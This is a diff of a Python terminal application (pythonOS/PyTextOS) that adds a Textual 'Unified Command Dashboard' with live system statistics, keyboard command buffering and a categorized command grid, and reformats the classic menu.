+            with Vertical(id="main-container"):
+                yield RealtimeStatsWidget(id="stats-panel")
+
+                with TabbedContent(id="tabs-container"):
+                    with TabPane("⌨️  Commands", id="commands-tab"):
+                        yield CommandPaletteWidget(id="commands-view")
+
+                    with TabPane("📊 System", id="system-tab"):
+                        yield SystemLogsWidget(id="logs-view")
+
+                    with TabPane("⚙️  Settings", id="settings-tab"):
+                        yield Static(
+                            Text.from_markup(
+                                "[bold cyan]⚙️  DASHBOARD SETTINGS[/bold cyan]\n"
+                                "────────────────────────\n"
+                                "[yellow]Update Interval:[/yellow] 500ms\n"
+                                "[yellow]Theme:[/yellow] Dark (Optimized)\n"
+                                "[yellow]Color Mode:[/yellow] 256-color TrueColor\n"
+                                "[yellow]Scroll Mode:[/yellow] Enabled\n"
+                                "[yellow]System Monitoring:[/yellow] Active\n"
+                                "[yellow]Auto-refresh:[/yellow] Enabled\n\n"
+                                "[bold]Feature Status:[/bold]\n"
+                                "[green]✓[/green] Real-time Stats\n"
+                                "[green]✓[/green] Command Integration\n"
+                                "[green]✓[/green] Tabbed Interface\n"
+                                "[green]✓[/green] System Logging\n"
+                            ),
+                            id="settings-view"
+                        )
+
+            yield Footer()
+
+        def action_quit_app(self) -> None:
+            """Quit the application."""
+            self.exit()
+
+        def action_show_help(self) -> None:
+            """Display help information."""
+            help_panel = Panel(
+                Text.from_markup(
+                    "[bold cyan]pythonOS Dashboard Help[/bold cyan]\n\n"
+                    "[yellow]Navigation:[/yellow]\n"
+                    "• Press TAB to switch between tabs\n"
+                    "• Press UP/DOWN to scroll within tabs\n"
+                    "• Press any command key (0-9, A-Z, +, *, ~) to execute\n\n"
+                    "[yellow]Commands:[/yellow]\n"
+                    "• Q = Quit dashboard\n"
+                    "• ? = Show this help\n"
+                    "• R = Refresh stats\n\n"
+                    "[yellow]Tabs:[/yellow]\n"
+                    "• Commands = Full command palette\n"
+                    "• System = System info and logs\n"
+                    "• Settings = Dashboard configuration\n"
+                ),
+                title="Help",
+                border_style="cyan"
+            )
+            self._show_overlay(help_panel)
+
+        def action_refresh(self) -> None:
+            """Manually refresh statistics."""
+            stats_widget = self.query_one("#stats-panel", RealtimeStatsWidget)
+            stats_widget.refresh()
+
+        def action_run_cmd(self, cmd: str) -> None:
+            """Execute a command."""
+            self._execute_command(cmd)
+
+        def on_key(self, event) -> None:
+            """Handle key presses with intelligent buffering and confirmation."""
+            key = event.key.lower()
+
+            # Handle special commands that bypass buffer
+            if key == "q":
+                self.action_quit_app()
+                event.prevent_default()
+                return
+
+            if key == "?":
+                self.action_show_help()
+                event.prevent_default()
+                return
+
+            if key == "r":
+                self.action_refresh()
+                event.prevent_default()
+                return
+
+            # If user presses Enter on selected command, execute it
+            if key == "enter" and self.selected_command:
+                cmd_to_execute = self.selected_command.split("[")[1].split("]")[0]  # Extract command key
+                self.selected_command = ""
+                sys_logs = self.query_one("SystemLogsWidget")
+                sys_logs.selected_cmd = ""
+                self._execute_command(cmd_to_execute)
+                event.prevent_default()
+                return
+
+            # Any key other than Enter cancels selection
+            if self.selected_command and key != "enter":
+                self.selected_command = ""
+                sys_logs = self.query_one("SystemLogsWidget")
+                sys_logs.selected_cmd = ""
+
+            # Handle command keys with intelligent buffering
+            if key in "0123456789abcdefghijklmnopqrstuvwxyz*+~":
+                # Add to command buffer
+                self.command_buffer += key
+
+                # Cancel any existing timer
+                if self.command_timer:
+                    try:
+                        self.remove_timer(self.command_timer)
+                    except:
+                        pass
+                    self.command_timer = None
+
+                # Check if we have a complete multi-digit command
+                if self.command_buffer in self.MULTI_DIGIT_COMMANDS:
+                    # Valid multi-digit command - set longer timeout to allow continuation
+                    self.command_timer = self.set_timer(0.5, self._show_selected_command)
+
+                # Check if buffer could grow to a multi-digit command
+                elif len(self.command_buffer) == 1 and self.command_buffer in "123":
+                    # Could become 10-14, wait for next digit
+                    self.command_timer = self.set_timer(0.5, self._show_selected_command)
+
+                # Single character commands show for confirmation (not 1, 2, 3)
+                elif len(self.command_buffer) == 1:
+                    self._show_selected_command()
+
+                # If buffer is longer than expected, process it
+                elif len(self.command_buffer) > 2:
+                    self._show_selected_command()
+
+                event.prevent_default()
+
+        def _show_selected_command(self) -> None:
+            """Show the buffered command for confirmation."""
+            if not self.command_buffer:
+                return
+
+            cmd_key = self.command_buffer.strip()
+            self.command_buffer = ""
+
+            # Clear timer
+            if self.command_timer:
+                try:
+                    self.remove_timer(self.command_timer)
+                except:
+                    pass
+            self.command_timer = None
+
+            # Show command name if it exists in COMMAND_MAP
+            if cmd_key in COMMAND_MAP:
+                op_name, _ = COMMAND_MAP[cmd_key]
+                self.selected_command = f"{op_name} [{cmd_key}]"
+                sys_logs = self.query_one("SystemLogsWidget")
+                sys_logs.selected_cmd = self.selected_command
+            else:
+                self.selected_command = ""
+
+        def _execute_command(self, cmd_key: str) -> None:
+            """Execute command and exit dashboard."""
+            if cmd_key in COMMAND_MAP:
+                op_name, op_func = COMMAND_MAP[cmd_key]
+                if op_name and op_func:
+                    # Exit with command marker
+                    self.exit(result=f"cmd:{cmd_key}")
+
+        def _show_overlay(self, panel: Panel) -> None:
+            """Display an overlay panel (simplified for now)."""
+            pass
+
+    # Main dashboard loop - stays in dashboard until user presses Q
+    while True:
+        try:
+            app = UnifiedDashboard()
+            result = app.run()
+
+            # If a command was executed, run it after dashboard exits
+            if isinstance(result, str) and result.startswith("cmd:"):
+                cmd_key = result.split(":", 1)[1]
+
+                if cmd_key in COMMAND_MAP:
+                    op_name, op_func = COMMAND_MAP[cmd_key]
+                    if op_name and op_func:
+                        try:
+                            safe_run(None, op_name, op_func)
+                        except Exception as e:
+                            print(f"Error executing command: {e}")
+                        finally:
+                            # After command completes, offer to return to dashboard
+                            try:
+                                input("\n[Press Enter to return to dashboard...]")
+                            except (KeyboardInterrupt, EOFError):
+                                pass
+                            # Loop back to dashboard (don't return, just continue)
+                            continue
+
+            # If we get here and result is None, user pressed Q to quit
+            break
+
+        except KeyboardInterrupt:
+            break
+        except Exception as e:
+            print(f"Dashboard error: {e}")
+            import traceback
+            traceback.print_exc()
+            break
+
+    # Only return to classic if explicitly requested
+    if return_to_classic:
+        return run_classic_command_center()
+
 # Command Center actions presented in the Textual shell. Entries may include
 # optional metadata (category, operation, func, mode) alongside title/summary.
 COMMAND_CENTER_ACTIONS = [
@@ -25759,6 +27505,7 @@ COMMAND_CENTER_ACTIONS = [
     ("widget_board", {"title": "Textual Widget Board", "summary": "Calculator, MP3, notes, stats, and stopwatch widgets.", "category": "general", "operation": "Widget_Board", "func": feature_textual_widget_board}),
     ("classic", {"title": "Classic Command Center", "summary": "Switch to legacy classic menu.", "mode": "classic"}),
     ("file_manager_suite", {"title": "File Manager Suite", "summary": "Choose curses or Textual file managers.", "category": "file", "operation": "File_Manager_Suite", "func": feature_file_manager_suite}),
+    ("unified_dashboard", {"title": "Unified Command Dashboard", "summary": "Full-screen dashboard with all features in a grid + live monitoring.", "category": "system", "operation": "Unified_Dashboard", "func": run_unified_dashboard, "shortcut": "3"}),
 ]
 
 COMMAND_ACTION_MAP = {key: meta for key, meta in COMMAND_CENTER_ACTIONS}
@@ -25774,11 +27521,11 @@ def _build_classic_app_menu_options():
     """
     Build menu options from CLASSIC_APP_ACTIONS for display in both classic and PyTextOS.
     This ensures both menus stay in sync automatically when items are added/removed.
-    
+
     Returns: Dict with layout info for displaying the menu.
     """
     app_options = []
-    
+
     # Define a mapping of app keys to their single-letter shortcuts
     single_letter_keys = {
         'browser': '7', 'disk': '8', 'process': '9', 'plugin': '10',
@@ -25790,17 +27537,17 @@ def _build_classic_app_menu_options():
         'pwn': 'P', 'python_power': 'Q', 'satellite': 'R', 'calculator': 'S',
         'docs': 'T', 'ram_drive': 'Y', 'dynamic_folder': 'Z', 'server_client': '14'
     }
-    
+
     for key, meta in CLASSIC_APP_ACTIONS:
         shortcut = single_letter_keys.get(key, '?')
         title = meta.get("title", key)
         app_options.append((shortcut, title, key))
-    
+
     # Also add special options
     special_opts = [
         ('X', 'TUI Tools', 'tui_tools'),
     ]
-    
+
     return {
         'apps': app_options,
         'special': special_opts,
@@ -25810,44 +27557,50 @@ def _build_classic_app_menu_options():
 def _format_classic_menu_display():
     """
     Format the classic command center menu for display.
-    Dynamically generates the menu from CLASSIC_APP_ACTIONS.
-    
+    All Command Center options organized in a horizontal grid layout.
+
     Returns: Formatted menu string for printing.
     """
     menu_data = _build_classic_app_menu_options()
-    
-    # Build formatted menu lines (compact layout)
+
+    # Build formatted menu lines (horizontal grid layout)
     lines = []
-    items = menu_data['apps']
-    
-    # Start with static options
-    lines.append(f" {BOLD}[1]{RESET} ✨ Blink: {'ON ' if is_blinking else 'OFF'}  {BOLD}[2]{RESET} 🌡️ Temp: {temp_unit}  {BOLD}[3]{RESET} 🌡️ Thermal: {'S' if truncated_thermal else 'F'}")
-    lines.append(f" {BOLD}[4]{RESET} 📏 Mini: {'ON ' if mini_view else 'OFF'}  {BOLD}[5]{RESET} 🚪 Exit  {BOLD}[6]{RESET} 🎨 Colors")
-    
-    # Compact network & system tools
-    lines.append(f" {BOLD}[7]{RESET} 🌐 Browser  {BOLD}[8]{RESET} 💽 Disk  {BOLD}[9]{RESET} 📑 Process  {BOLD}[0]{RESET} Net  {BOLD}[10]{RESET} Plugin  {BOLD}[11]{RESET} Dashboard")
-    lines.append(f" {BOLD}[12]{RESET} PenTest  {BOLD}[13]{RESET} Defence  {BOLD}[14]{RESET} 🔗 Server/Client")
-    
-    # Security & Probing (A-E) - compact
-    lines.append(f" {BOLD}[A]{RESET} Audit  {BOLD}[B]{RESET} Env  {BOLD}[C]{RESET} Serial  {BOLD}[D]{RESET} AI Probe  {BOLD}[E]{RESET} Calendar")
-    
-    # Monitoring & Media (F-I, W) - compact
-    lines.append(f" {BOLD}[F]{RESET} Latency  {BOLD}[G]{RESET} Weather  {BOLD}[H]{RESET} Display  {BOLD}[I]{RESET} Media  {BOLD}[W]{RESET} pyBeacon")
-    
-    # Network Tools (J-M) - compact
-    lines.append(f" {BOLD}[J]{RESET} WiFi  {BOLD}[K]{RESET} AI Center  {BOLD}[L]{RESET} BT  {BOLD}[M]{RESET} Traffic")
-    
-    # Management Tools (N-T, X) - compact
-    lines.append(f" {BOLD}[N]{RESET} Logs  {BOLD}[O]{RESET} Download  {BOLD}[P]{RESET} PWN  {BOLD}[Q]{RESET} Python")
-    lines.append(f" {BOLD}[R]{RESET} Satellite  {BOLD}[S]{RESET} Calculator  {BOLD}[T]{RESET} Docs  {BOLD}[X]{RESET} TUI")
-    
-    # NEW: History & Shortcuts
-    lines.append(f" {BOLD}[↑]{RESET} Command History  {BOLD}[→]{RESET} Keyboard Shortcuts")
-    
-    # System & Display modes
-    lines.append(f" {BOLD}[Y]{RESET} RAM Drive  {BOLD}[Z]{RESET} ⚡ Perf Stats  {BOLD}[~]{RESET} 🏥 Health Report")
-    lines.append(f" {BOLD}[U]{RESET} Enhanced Mode  {BOLD}[V]{RESET} Exit Enhanced  {BOLD}[+]{RESET} 📋 Logger  {BOLD}[*]{RESET} 🔒 Sec Audit")
-    
+
+    # Row 0: INTERFACE SELECTION (NEW - Three Options)
+    lines.append(f" {COLORS['3'][0]}INTERFACE SELECTION:{RESET}")
+    lines.append(f" {BOLD}[1C]{RESET} 📜 Classic Menu  {BOLD}[2P]{RESET} 📋 PyTextOS List  {BOLD}[3D]{RESET} 🎯 Unified Dashboard")
+
+    # Row 1: Settings (1-6)
+    lines.append(f" {BOLD}[1]{RESET} ✨ Blink: {'ON ' if is_blinking else 'OFF'}  {BOLD}[2]{RESET} 🌡️ Temp: {temp_unit}  {BOLD}[3]{RESET} 🌡️ Thermal: {'S' if truncated_thermal else 'F'}  {BOLD}[4]{RESET} 📏 Mini: {'ON ' if mini_view else 'OFF'}")
+    lines.append(f" {BOLD}[5]{RESET} 🚪 Exit Main  {BOLD}[6]{RESET} 🎨 Colors  {BOLD}[7]{RESET} 🌐 Browser  {BOLD}[8]{RESET} 💽 Disk  {BOLD}[9]{RESET} 📑 Process")
+
+    # Row 2: Core Tools (0, 10-14)
+    lines.append(f" {BOLD}[0]{RESET} 🌐 Net Tools  {BOLD}[10]{RESET} 🔌 Plugin  {BOLD}[11]{RESET} 📊 Dashboard  {BOLD}[12]{RESET} 🔓 PenTest  {BOLD}[13]{RESET} 🛡️ Defence  {BOLD}[14]{RESET} 🔗 Server/Client")
+
+    # Row 3: Security & System (A-E)
+    lines.append(f" {BOLD}[A]{RESET} 🔐 Audit  {BOLD}[B]{RESET} 🔍 Env Probe  {BOLD}[C]{RESET} 📋 Serial  {BOLD}[D]{RESET} 🤖 AI Probe  {BOLD}[E]{RESET} 📅 Calendar")
+
+    # Row 4: Monitoring & Media (F-I, W)
+    lines.append(f" {BOLD}[F]{RESET} ⏱️ Latency  {BOLD}[G]{RESET} 🌤️ Weather  {BOLD}[H]{RESET} 🎨 Display FX  {BOLD}[I]{RESET} 🎵 Media  {BOLD}[W]{RESET} 📡 pyBeacon")
+
+    # Row 5: Network Tools (J-M)
+    lines.append(f" {BOLD}[J]{RESET} 📶 WiFi  {BOLD}[K]{RESET} 🧠 AI Center  {BOLD}[L]{RESET} 🔵 Bluetooth  {BOLD}[M]{RESET} 📊 Traffic")
+
+    # Row 5b: AI-Tactical Integration (NEW)
+    lines.append(f" {BOLD}[({RESET} 🤖🎯 AI-Tactical Status  {BOLD})]{RESET} 🎛️ AI-Tactical Control Panel")
+
+    # Row 6: Utilities (N-T, X, Y, Z)
+    lines.append(f" {BOLD}[N]{RESET} 📋 Logs  {BOLD}[O]{RESET} 📥 Download  {BOLD}[P]{RESET} 🔨 PWN Tools  {BOLD}[Q]{RESET} 🐍 Python Power")
+
+    # Row 7: More Utilities (R, S, T, X, Y)
+    lines.append(f" {BOLD}[R]{RESET} 🛰️ Satellite  {BOLD}[S]{RESET} 🧮 Calculator  {BOLD}[T]{RESET} 📄 Text/Doc  {BOLD}[X]{RESET} 🖥️ TUI Tools  {BOLD}[Y]{RESET} 💾 RAM Drive")
+
+    # Row 8: System & History (Z, ~, ↑, →)
+    lines.append(f" {BOLD}[Z]{RESET} ⚡ Perf Stats  {BOLD}[~]{RESET} 🏥 Health  {BOLD}[↑]{RESET} 📜 History  {BOLD}[→]{RESET} ⌨️ Shortcuts")
+
+    # Row 9: Advanced (U, V, +, *)
+    lines.append(f" {BOLD}[U]{RESET} 🎨 Enhanced  {BOLD}[V]{RESET} 🚪 Exit Enhanced  {BOLD}[+]{RESET} 📋 Logger  {BOLD}[*]{RESET} 🔒 Sec Audit")
+
     return "\n".join(lines)
 
 TEXTUAL_BAR_LENGTH = 20  # Usage bar spans 20 blocks (5% utilization per block)
@@ -26638,6 +28391,382 @@ def feature_enhanced_display_suite():
 
     EnhancedDisplaySuite().run()
 
+
+# ================================================================================
+# SECTION 19A: UNIFIED DASHBOARD - THIRD INTERFACE (PHASE 1 & 2)
+# ================================================================================
+# A comprehensive full-screen dashboard displaying all features and real-time
+# system monitoring in an intuitive grid layout with advanced navigation.
+
+def run_unified_dashboard(return_to_classic=False):
+    """Launch the Unified Command Dashboard as the third interface option."""
+    if not _ensure_textual_imports():
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(f"{COLORS['1'][0]}ERROR: Textual failed to load!{RESET}")
+        if _TEXTUAL_IMPORT_ERROR:
+            print(f"Reason: {_TEXTUAL_IMPORT_ERROR}")
+        print(f"Install/upgrade with: {BOLD}pip install --upgrade textual rich pygments{RESET}")
+        print("\nFalling back to classic Command Center...")
+        time.sleep(2)
+        _set_display_mode("classic")
+        return run_classic_command_center()
+
+    # Initialize plugin system
+    if PluginManager:
+        try:
+            initialize_plugin_system(PLUGINS_DIR)
+        except Exception as e:
+            print(f"⚠️ Plugin system initialization error: {e}")
+
+    try:
+        from textual.app import App, ComposeResult
+        from textual.containers import Container, Horizontal, Vertical, Grid
+        from textual.widgets import Static, Label, Button
+        from textual.reactive import reactive
+        from textual.binding import Binding
+
+        class SystemStatsWidget(Static):
+            """Real-time system monitoring widget (Phase 2)."""
+
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, **kwargs)
+                self.update_counter = 0
+
+            def render(self):
+                """Render live system statistics."""
+                try:
+                    cpu_pct = psutil.cpu_percent(interval=0.1)
+                    mem = psutil.virtual_memory()
+                    disk = psutil.disk_usage('/')
+
+                    # Network stats
+                    net_io = psutil.net_io_counters()
+
+                    stats = f"""
+[bold cyan]═══════════════════════════════════════════════════════════════[/bold cyan]
+[bold]🖥️  SYSTEM DASHBOARD[/bold]
+[bold cyan]═══════════════════════════════════════════════════════════════[/bold cyan]
+
+[bold yellow]CPU INFORMATION[/bold yellow]
+CPU Usage:  {_render_usage_bar(cpu_pct)} {cpu_pct:.1f}%
+
+[bold yellow]MEMORY INFORMATION[/bold yellow]
+RAM Used:   {_render_usage_bar(mem.percent)} {mem.percent:.1f}% ({mem.used // (1024**3)}GB / {mem.total // (1024**3)}GB)
+Swap Used:  {_render_usage_bar(psutil.swap_memory().percent)} {psutil.swap_memory().percent:.1f}%
+
+[bold yellow]STORAGE INFORMATION[/bold yellow]
+Disk Used:  {_render_usage_bar(disk.percent)} {disk.percent:.1f}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)
+
+[bold yellow]NETWORK INFORMATION[/bold yellow]
+Packets Sent:     {net_io.packets_sent:,}
+Packets Recv:     {net_io.packets_recv:,}
+Bytes Sent:       {net_io.bytes_sent // (1024**2)}MB
+Bytes Recv:       {net_io.bytes_recv // (1024**2)}MB
+
+[bold yellow]PROCESS INFORMATION[/bold yellow]
+Running Processes: {len(psutil.pids())}
+
+[bold yellow]SYSTEM UPTIME[/bold yellow]
+Boot Time: {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
+                    """
+                    return stats
+                except Exception as e:
+                    return f"[red]Error rendering stats: {e}[/red]"
+
+        class CommandButton(Static):
+            """Individual command option button in the grid."""
+
+            DEFAULT_CSS = """
+            CommandButton {
+                width: 1fr;
+                height: 3;
+                border: solid $primary;
+                background: $panel;
+            }
+
+            CommandButton:hover {
+                background: $boost;
+                border: double $accent;
+            }
+
+            CommandButton.focused {
+                background: $accent;
+                color: $text;
+                border: double $highlight;
+            }
+            """
+
+            def __init__(self, key, title, category, *args, **kwargs):
+                super().__init__(*args, **kwargs)
+                self.key = key
+                self.title = title
+                self.category = category
+                self.focused = False
+
+            def render(self):
+                title = self.title[:12]  # Truncate long titles
+                status = "→" if self.focused else " "
+                return f"[{self.key}] {status} {title}"
+
+        class UnifiedDashboard(App):
+            """Full-screen unified command dashboard with grid layout."""
+
+            BINDINGS = [
+                Binding("q", "quit", "Quit", show=True),
+                Binding("h", "focus_prev", "◀ Previous", show=False),
+                Binding("l", "focus_next", "▶ Next", show=False),
+                Binding("k", "focus_up", "▲ Up", show=False),
+                Binding("j", "focus_down", "▼ Down", show=False),
+                Binding("enter", "run_selected", "Execute", show=True),
+                Binding("r", "run_selected", "Run", show=False),
+                Binding("slash", "search", "Search", show=True),
+                Binding("?", "show_help", "Help", show=True),
+            ]
+
+            CSS = """
+            Screen {
+                background: $panel;
+                color: $text;
+            }
+
+            Header {
+                dock: top;
+                height: 3;
+                background: $accent;
+                color: $text;
+                border-bottom: solid $primary;
+            }
+
+            Footer {
+                dock: bottom;
+                background: $primary;
+                color: $text;
+                border-top: solid $accent;
+            }
+
+            #stats-panel {
+                height: 1fr;
+                border: solid $primary;
+                background: $boost;
+            }
+
+            #command-grid {
+                width: 1fr;
+                height: 1fr;
+                border: solid $primary;
+                background: $panel;
+            }
+
+            #search-box {
+                width: 100%;
+                height: 3;
+                border: solid $primary;
+                background: $boost;
+            }
+            """
+
+            selected_idx = reactive(0)
+            search_active = reactive(False)
+            search_term = reactive("")
+
+            def __init__(self, actions, action_map, *args, **kwargs):
+                super().__init__(*args, **kwargs)
+                self.actions = actions
+                self.action_map = action_map
+
+                # Build command grid from COMMAND_CENTER_ACTIONS
+                self.commands = []
+                self.categories = {
+                    "System": [],
+                    "Tools": [],
+                    "Security": [],
+                    "Network": [],
+                    "Media": [],
+                    "Advanced": []
+                }
+
+                # Map actions to categories
+                self._categorize_actions()
+
+                self.selected_idx = 0
+                self.buttons = []
+
+            def _categorize_actions(self):
+                """Organize actions by category."""
+                category_map = {
+                    "system": "System",
+                    "browser": "Tools",
+                    "disk": "Tools",
+                    "process": "Tools",
+                    "plugin": "Tools",
+                    "dashboard": "System",
+                    "pentest": "Security",
+                    "defence": "Security",
+                    "network": "Network",
+                    "audit": "Security",
+                    "env": "Advanced",
+                    "hardware": "Advanced",
+                    "ai_probe": "Advanced",
+                    "media": "Media",
+                    "weather": "Advanced",
+                    "wifi": "Network",
+                    "bluetooth": "Network",
+                    "calculator": "Tools",
+                    "docs": "Tools",
+                }
+
+                for key, meta in self.actions:
+                    cat = category_map.get(key, "Advanced")
+                    title = meta.get("title", key.replace("_", " ").title())
+                    self.commands.append((key, title, cat, meta))
+                    if cat in self.categories:
+                        self.categories[cat].append((key, title, meta))
+
+            def compose(self) -> ComposeResult:
+                """Compose the dashboard layout."""
+                yield from [
+                    Static(f"[bold cyan]PYTEXTOS UNIFIED DASHBOARD[/bold cyan] | Press [yellow]?[/yellow] for help",
+                           id="header"),
+                    Vertical(
+                        SystemStatsWidget(id="stats-panel"),
+                        Static(self._render_command_grid(), id="command-grid"),
+                        id="main-container"
+                    ),
+                    Static(f"[yellow]Q[/yellow]uit | [yellow]Enter[/yellow] Execute | [yellow]/[/yellow] Search | [yellow]?[/yellow] Help | Navigate: [yellow]HJKL[/yellow]",
+                           id="footer")
+                ]
+
+            def _render_command_grid(self) -> str:
+                """Render the command grid display."""
+                output = "[bold cyan]═══════════════════════════════════════════════════════════════[/bold cyan]\n"
+                output += "[bold]🎯 COMMAND GRID[/bold cyan]\n"
+                output += "[bold cyan]═══════════════════════════════════════════════════════════════[/bold cyan]\n\n"
+
+                # Show by category
+                for cat, commands in self.categories.items():
+                    if not commands:
+                        continue
+                    output += f"[bold yellow]{cat.upper()}[/bold yellow]\n"
+
+                    # Display in 4-column grid
+                    for i in range(0, len(commands), 4):
+                        row_items = commands[i:i+4]
+                        for key, title, meta in row_items:
+                            idx = self.commands.index((key, title, cat, meta))
+                            is_selected = (idx == self.selected_idx)
+                            marker = "[bold green]→[/bold green]" if is_selected else " "
+                            shortcut = meta.get("shortcut", "?")
+                            output += f"  {marker} [{shortcut}] {title[:15]:<16}  "
+                        output += "\n"
+                    output += "\n"
+
+                return output
+
+            def action_focus_next(self):
+                """Move to next command."""
+                self.selected_idx = (self.selected_idx + 1) % len(self.commands)
+                self.refresh()
+
+            def action_focus_prev(self):
+                """Move to previous command."""
+                self.selected_idx = (self.selected_idx - 1) % len(self.commands)
+                self.refresh()
+
+            def action_focus_down(self):
+                """Move down 4 items (grid row)."""
+                self.selected_idx = min(self.selected_idx + 4, len(self.commands) - 1)
+                self.refresh()
+
+            def action_focus_up(self):
+                """Move up 4 items (grid row)."""
+                self.selected_idx = max(self.selected_idx - 4, 0)
+                self.refresh()
+
+            def action_run_selected(self):
+                """Execute the selected command."""
+                if self.selected_idx < len(self.commands):
+                    key, title, cat, meta = self.commands[self.selected_idx]
+                    self.app.exit()
+
+                    # Execute the action
+                    if "func" in meta:
+                        try:
+                            meta["func"]()
+                        except Exception as e:
+                            print(f"{COLORS['1'][0]}Error executing {title}: {e}{RESET}")
+                    else:
+                        print(f"{COLORS['6'][0]}Selected: {title}{RESET}")
+
+                    # Relaunch dashboard
+                    time.sleep(0.5)
+                    run_unified_dashboard(return_to_classic=return_to_classic)
+
+            def action_search(self):
+                """Activate search mode."""
+                self.search_active = not self.search_active
+                self.refresh()
+
+            def action_show_help(self):
+                """Show help information."""
+                help_text = f"""
+{COLORS['3'][0]}[bold cyan]UNIFIED DASHBOARD HELP{RESET}
+
+{COLORS['2'][0]}[bold yellow]Navigation:{RESET}
+  H/L or ◀/▶  - Move left/right
+  K/J or ▲/▼  - Move up/down
+  Enter/R     - Execute selected command
+
+{COLORS['2'][0]}[bold yellow]Operations:{RESET}
+  Q           - Quit to main menu
+  /           - Search commands
+  ?           - Show this help
+
+{COLORS['2'][0]}[bold yellow]Categories:{RESET}
+  System      - OS & hardware monitoring
+  Tools       - Utilities & managers
+  Security    - Audit & penetration
+  Network     - WiFi, Bluetooth, VPN
+  Media       - Audio/video players
+  Advanced    - AI, weather, AI-Tactical
+
+Press any key to close...
+                """
+                print(help_text)
+                input()
+                self.refresh()
+
+            def on_key(self, event):
+                """Handle direct keyboard shortcuts for quick access."""
+                # Map shortcuts directly to commands
+                shortcuts = {
+                    "1": 1, "2": 2, "3": 3, "4": 4, "5": 5,
+                    "6": 6, "7": 7, "8": 8, "9": 9, "0": 0,
+                }
+
+                # Check if key is a shortcut
+                key_str = event.character if hasattr(event, 'character') else None
+                if key_str and key_str.isdigit():
+                    idx = int(key_str)
+                    if idx < len(self.commands):
+                        self.selected_idx = idx
+                        self.action_run_selected()
+
+        # Run the dashboard
+        dashboard = UnifiedDashboard(COMMAND_CENTER_ACTIONS, COMMAND_ACTION_MAP)
+        dashboard.run()
+
+    except ImportError:
+        print(f"{COLORS['1'][0]}ERROR: Failed to import Textual components!{RESET}")
+        time.sleep(2)
+        return run_classic_command_center()
+    except Exception as e:
+        print(f"{COLORS['1'][0]}FATAL ERROR in Unified Dashboard: {e}{RESET}")
+        import traceback
+        traceback.print_exc()
+        time.sleep(3)
+        return run_classic_command_center()
+
+
 def run_pytextos(return_to_classic=False):
     if not _ensure_textual_imports():
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -26649,7 +28778,7 @@ def run_pytextos(return_to_classic=False):
         time.sleep(2)
         _set_display_mode("classic")
         return run_classic_command_center()
-    
+
     # Initialize plugin system with centralized pythonOS_data location
     if PluginManager:
         try:
@@ -27263,11 +29392,11 @@ def run_pytextos(return_to_classic=False):
 def feature_command_history_search():
     """Search and recall commands from history like bash."""
     global COMMAND_HISTORY
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🕐 Command History & Search")
-        
+
         print(f"\n{BOLD}History Management:{RESET}")
         print(f" {BOLD}[1]{RESET} 🔍 Search Commands")
         print(f" {BOLD}[2]{RESET} 📈 Most Frequently Used")
@@ -27277,9 +29406,9 @@ def feature_command_history_search():
         print(f" {BOLD}[6]{RESET} 💾 Export History")
         print(f" {BOLD}[7]{RESET} 🗑️  Clear History (⚠️ Dangerous)")
         print(f" {BOLD}[0]{RESET} ↩️  Return")
-        
+
         choice = input(f"\n{BOLD}Select option: {RESET}").strip()
-        
+
         if choice == '0':
             break
         elif choice == '1':
@@ -27298,7 +29427,7 @@ def feature_command_history_search():
                 else:
                     print(f"{COLORS['4'][0]}No matching commands found.{RESET}")
                 input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '2':
             # Most frequently used
             freq = COMMAND_HISTORY.get_frequently_used(limit=30)
@@ -27312,7 +29441,7 @@ def feature_command_history_search():
             else:
                 print(f"{COLORS['4'][0]}No history available.{RESET}")
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '3':
             # Recent commands
             recent = COMMAND_HISTORY.get_recent(count=30)
@@ -27327,18 +29456,18 @@ def feature_command_history_search():
             else:
                 print(f"{COLORS['4'][0]}No history available.{RESET}")
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '4':
             # By category
             stats = COMMAND_HISTORY.get_stats()
             categories = stats.get("categories", {})
-            
+
             print(f"\n{BOLD}Available Categories:{RESET}")
             cat_list = list(categories.keys())
             for i, cat in enumerate(cat_list, 1):
                 count = categories[cat]
                 print(f"  [{i}] {cat.capitalize()} ({count} commands)")
-            
+
             cat_choice = input(f"\n{BOLD}Select category number: {RESET}").strip()
             if cat_choice.isdigit() and 1 <= int(cat_choice) <= len(cat_list):
                 selected_cat = cat_list[int(cat_choice) - 1]
@@ -27347,9 +29476,9 @@ def feature_command_history_search():
                 for i, entry in enumerate(by_cat, 1):
                     cmd = entry.get("command", "")[:70]
                     print(f"  {i:2d}. {cmd}")
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '5':
             # Statistics
             stats = COMMAND_HISTORY.get_stats()
@@ -27357,30 +29486,30 @@ def feature_command_history_search():
             print(f"  📝 Total Commands: {stats['total_commands']}")
             print(f"  ⚙️  Total Executions: {stats['total_executions']}")
             print(f"  📂 Categories: {len(stats['categories'])}")
-            
+
             print(f"\n{BOLD}Commands by Category:{RESET}")
             for cat, count in sorted(stats['categories'].items(), key=lambda x: x[1], reverse=True):
                 bar = draw_bar(count * 100 / max(stats['categories'].values(), 1) if stats['categories'] else 0)
                 print(f"  {cat.capitalize():20} {bar}")
-            
+
             if stats['oldest_entry']:
                 print(f"\n{COLORS['4'][0]}Oldest Entry: {stats['oldest_entry'].get('timestamp', 'N/A')}{RESET}")
             if stats['newest_entry']:
                 print(f"{COLORS['2'][0]}Newest Entry: {stats['newest_entry'].get('timestamp', 'N/A')}{RESET}")
-            
+
             input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-        
+
         elif choice == '6':
             # Export
             print(f"\n{BOLD}Export Format:{RESET}")
             print(f"  [1] JSON")
             print(f"  [2] CSV")
-            
+
             export_choice = input(f"\n{BOLD}Select format: {RESET}").strip()
             if export_choice in ('1', '2'):
                 fmt = 'json' if export_choice == '1' else 'csv'
                 exported = COMMAND_HISTORY.export_history(format=fmt)
-                
+
                 export_file = os.path.join(DB_DIR, f"command_history_export.{fmt}")
                 try:
                     with open(export_file, 'w', encoding='utf-8') as f:
